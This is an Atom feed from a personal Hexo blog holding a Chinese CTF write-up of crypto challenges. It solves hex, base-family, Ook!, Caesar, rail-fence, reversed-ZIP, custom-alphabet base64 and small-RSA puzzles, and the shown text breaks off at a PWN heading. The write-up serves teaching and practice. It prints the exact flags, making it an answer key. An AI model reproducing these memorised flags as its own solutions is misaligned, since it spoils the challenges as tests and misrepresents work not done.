<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://z1ek34r.github.io/atom.xml" rel="self"/>
  
  <link href="http://z1ek34r.github.io/"/>
  <updated>2022-01-25T11:45:19.656Z</updated>
  <id>http://z1ek34r.github.io/</id>
  
  <author>
    <name>z1ek34r</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>青科X山师CTF部分WP</title>
    <link href="http://z1ek34r.github.io/2022/01/25/%E9%9D%92%E7%A7%91X%E5%B1%B1%E5%B8%88CTF%E9%83%A8%E5%88%86WP/"/>
    <id>http://z1ek34r.github.io/2022/01/25/%E9%9D%92%E7%A7%91X%E5%B1%B1%E5%B8%88CTF%E9%83%A8%E5%88%86WP/</id>
    <published>2022-01-25T11:27:14.000Z</published>
    <updated>2022-01-25T11:45:19.656Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="1-Welcome"><a href="#1-Welcome" class="headerlink" title="1.Welcome"></a>1.Welcome</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666c61677b77656c636f6d655f546f5f4354467d</span><br></pre></td></tr></table></figure><p>16进制转字符串：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;welcome_To_CTF&#125;</span><br></pre></td></tr></table></figure><h2 id="2-base家族"><a href="#2-base家族" class="headerlink" title="2.base家族"></a>2.base家族</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OWoxVWc2V3U5JTkyXD5NN2wpbyc5MV5zMTkzNGVkN288R2sxL3BWLTowS0dEN3A3XUA5TDpMJjlmI15NOTFEcl03OEhUUDkyXDVNMS1JY2A</span><br></pre></td></tr></table></figure><p><img src="http://z1ek34r.github.io/2022/01/25/%E9%9D%92%E7%A7%91X%E5%B1%B1%E5%B8%88CTF%E9%83%A8%E5%88%86WP/pasted-0.png"></p><p>basecrack一把梭。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;TPCoXR8eYs43mLAnvcgiXt6nWQk29mTJ&#125;</span><br></pre></td></tr></table></figure><h2 id="3-混合加密"><a href="#3-混合加密" class="headerlink" title="3.混合加密"></a>3.混合加密</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!</span><br><span class="line">Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook?</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?</span><br><span class="line">Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook.</span><br><span class="line">Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.</span><br><span class="line">Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?</span><br><span class="line">Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook?</span><br><span class="line">Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook!</span><br><span class="line">Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook?</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!</span><br><span class="line">Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook!</span><br><span class="line">Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook?</span><br><span class="line">Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook.</span><br><span class="line">Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook?</span><br><span class="line">Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook?</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook!</span><br><span class="line">Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?</span><br><span class="line">Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook. Ook? Ook. </span><br></pre></td></tr></table></figure><p>ook解密：<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qwlr&#123;9KiJmx5&#125;xB00TBtXCgbWh2heIScByy6z5</span><br></pre></td></tr></table></figure><p>凯撒枚举得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">9</span>ZxYbm5&#125;mQ00IQiMRvqLw2wtXHrQnn6o5</span><br></pre></td></tr></table></figure><p>W形栅栏25栏：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9ZxYbm5m0IiRqwwXrn65onQHt2LvMQ0Q&#125;</span><br></pre></td></tr></table></figure><h2 id="4-base64"><a href="#4-base64" class="headerlink" title="4.base64?"></a>4.base64?</h2><p>得到一串像base64的字符和一个压缩包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OWoxVWc2V3U5JTkyXD5NN2wpbyc5MV5zMTkzNGVkN288R2sxL3BWLTowS0dEN3A3XUA5TDpMJjlmI15NOTFEcl03OEhUUDkyXDVNMS1JY2A</span><br></pre></td></tr></table></figure><p>base64解出来是乱码。</p><p>将压缩包拖进hex</p><p><img src="http://z1ek34r.github.io/2022/01/25/%E9%9D%92%E7%A7%91X%E5%B1%B1%E5%B8%88CTF%E9%83%A8%E5%88%86WP/pasted-1.png"></p><p>发现是倒叙的pk 用python将它变回来得到压缩包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x7f</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x5c</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x06</span>,<span class="number">0x05</span>,<span class="number">0x4b</span>,<span class="number">0x50</span>,<span class="number">0x01</span>,<span class="number">0xd6</span>,<span class="number">0x86</span>,<span class="number">0x6a</span>,<span class="number">0xda</span>,<span class="number">0x12</span>,<span class="number">0x44</span>,<span class="number">0xc1</span>,<span class="number">0x01</span>,<span class="number">0xd6</span>,<span class="number">0x86</span>,<span class="number">0x6b</span>,<span class="number">0xc2</span>,<span class="number">0x59</span>,<span class="number">0x1b</span>,<span class="number">0x25</span>,<span class="number">0x01</span>,<span class="number">0xd6</span>,<span class="number">0x86</span>,<span class="number">0x6b</span>,<span class="number">0xc2</span>,<span class="number">0x59</span>,<span class="number">0x1b</span>,<span class="number">0x25</span>,<span class="number">0x00</span>,<span class="number">0x18</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x0a</span>,<span class="number">0x74</span>,<span class="number">0x78</span>,<span class="number">0x74</span>,<span class="number">0x2e</span>,<span class="number">0x34</span>,<span class="number">0x36</span>,<span class="number">0x65</span>,<span class="number">0x73</span>,<span class="number">0x61</span>,<span class="number">0x62</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x24</span>,<span class="number">0x00</span>,<span class="number">0x0a</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x57</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x57</span>,<span class="number">0x55</span>,<span class="number">0x11</span>,<span class="number">0x5a</span>,<span class="number">0xd7</span>,<span class="number">0x51</span>,<span class="number">0x29</span>,<span class="number">0x6d</span>,<span class="number">0x16</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x0a</span>,<span class="number">0x00</span>,<span class="number">0x3f</span>,<span class="number">0x02</span>,<span class="number">0x01</span>,<span class="number">0x4b</span>,<span class="number">0x50</span>,<span class="number">0x2f</span>,<span class="number">0x2b</span>,<span class="number">0x39</span>,<span class="number">0x38</span>,<span class="number">0x6e</span>,<span class="number">0x6d</span>,<span class="number">0x6c</span>,<span class="number">0x6b</span>,<span class="number">0x6a</span>,<span class="number">0x69</span>,<span class="number">0x68</span>,<span class="number">0x67</span>,<span class="number">0x66</span>,<span class="number">0x65</span>,<span class="number">0x59</span>,<span class="number">0x58</span>,<span class="number">0x57</span>,<span class="number">0x56</span>,<span class="number">0x55</span>,<span class="number">0x64</span>,<span class="number">0x63</span>,<span class="number">0x62</span>,<span class="number">0x61</span>,<span class="number">0x5a</span>,<span class="number">0x4f</span>,<span class="number">0x4e</span>,<span class="number">0x4d</span>,<span class="number">0x4c</span>,<span class="number">0x4b</span>,<span class="number">0x54</span>,<span class="number">0x32</span>,<span class="number">0x31</span>,<span class="number">0x53</span>,<span class="number">0x52</span>,<span class="number">0x51</span>,<span class="number">0x50</span>,<span class="number">0x30</span>,<span class="number">0x7a</span>,<span class="number">0x79</span>,<span class="number">0x4a</span>,<span class="number">0x49</span>,<span class="number">0x48</span>,<span class="number">0x47</span>,<span class="number">0x46</span>,<span class="number">0x45</span>,<span class="number">0x44</span>,<span class="number">0x43</span>,<span class="number">0x42</span>,<span class="number">0x41</span>,<span class="number">0x37</span>,<span class="number">0x36</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x33</span>,<span class="number">0x71</span>,<span class="number">0x70</span>,<span class="number">0x6f</span>,<span class="number">0x75</span>,<span class="number">0x74</span>,<span class="number">0x73</span>,<span class="number">0x72</span>,<span class="number">0x78</span>,<span class="number">0x77</span>,<span class="number">0x76</span>,<span class="number">0x0a</span>,<span class="number">0x0d</span>,<span class="number">0x0a</span>,<span class="number">0x0d</span>,<span class="number">0x3f</span>,<span class="number">0x3f</span>,<span class="number">0x3f</span>,<span class="number">0x3f</span>,<span class="number">0x3f</span>,<span class="number">0x34</span>,<span class="number">0x36</span>,<span class="number">0x65</span>,<span class="number">0x73</span>,<span class="number">0x61</span>,<span class="number">0x62</span>,<span class="number">0x20</span>,<span class="number">0x73</span>,<span class="number">0x69</span>,<span class="number">0x68</span>,<span class="number">0x74</span>,<span class="number">0x20</span>,<span class="number">0x73</span>,<span class="number">0x49</span>,<span class="number">0x74</span>,<span class="number">0x78</span>,<span class="number">0x74</span>,<span class="number">0x2e</span>,<span class="number">0x34</span>,<span class="number">0x36</span>,<span class="number">0x65</span>,<span class="number">0x73</span>,<span class="number">0x61</span>,<span class="number">0x62</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x0a</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x57</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x57</span>,<span class="number">0x55</span>,<span class="number">0x11</span>,<span class="number">0x5a</span>,<span class="number">0xd7</span>,<span class="number">0x51</span>,<span class="number">0x29</span>,<span class="number">0x6d</span>,<span class="number">0x16</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x0a</span>,<span class="number">0x04</span>,<span class="number">0x03</span>,<span class="number">0x4b</span>,<span class="number">0x50</span>]</span><br><span class="line">a = s[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p>解压得到base64.txt</p><p><img src="http://z1ek34r.github.io/2022/01/25/%E9%9D%92%E7%A7%91X%E5%B1%B1%E5%B8%88CTF%E9%83%A8%E5%88%86WP/pasted-2.png"></p><p>想到base64换表，用python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">str1 = <span class="string">&quot;yNY2yjdgyEt2JN5lyKwL5Ny27Hq2Jfvl5uphJN5iyKQL6uBh5Og=&quot;</span></span><br><span class="line">string1 = <span class="string">&quot;vwxrstuopq34567ABCDEFGHIJyz0PQRS12TKLMNOZabcdUVWXYefghijklmn89+/&quot;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1, string2))))</span><br></pre></td></tr></table></figure><p>运行得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4e1abc9f0d2fa9bac090b5bc6f7d4d52&#125;</span><br></pre></td></tr></table></figure><h2 id="5-奇怪的图形"><a href="#5-奇怪的图形" class="headerlink" title="5.奇怪的图形"></a>5.奇怪的图形</h2><p><img src="http://z1ek34r.github.io/2022/01/25/%E9%9D%92%E7%A7%91X%E5%B1%B1%E5%B8%88CTF%E9%83%A8%E5%88%86WP/pasted-3.png"></p><p>包含夏多密码，猪圈密码，圣殿武士密码</p><p>夏多密码：<a href="https://blog.csdn.net/destiny1507/article/details/100701013">https://blog.csdn.net/destiny1507/article/details/100701013</a></p><p>其他：<a href="https://blog.csdn.net/dyw_666666/article/details/89973048">https://blog.csdn.net/dyw_666666/article/details/89973048</a></p><p>最后得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;flagisverybeautifll&#125;</span><br></pre></td></tr></table></figure><h2 id="6-Easy-RSA"><a href="#6-Easy-RSA" class="headerlink" title="6.Easy_RSA"></a>6.Easy_RSA</h2><p>解压得到flag.enc 和 public_key.pem分别是密文，公钥。</p><p>简单的大数分解，利用工具</p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Simple_RSa&#125;</span><br></pre></td></tr></table></figure><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 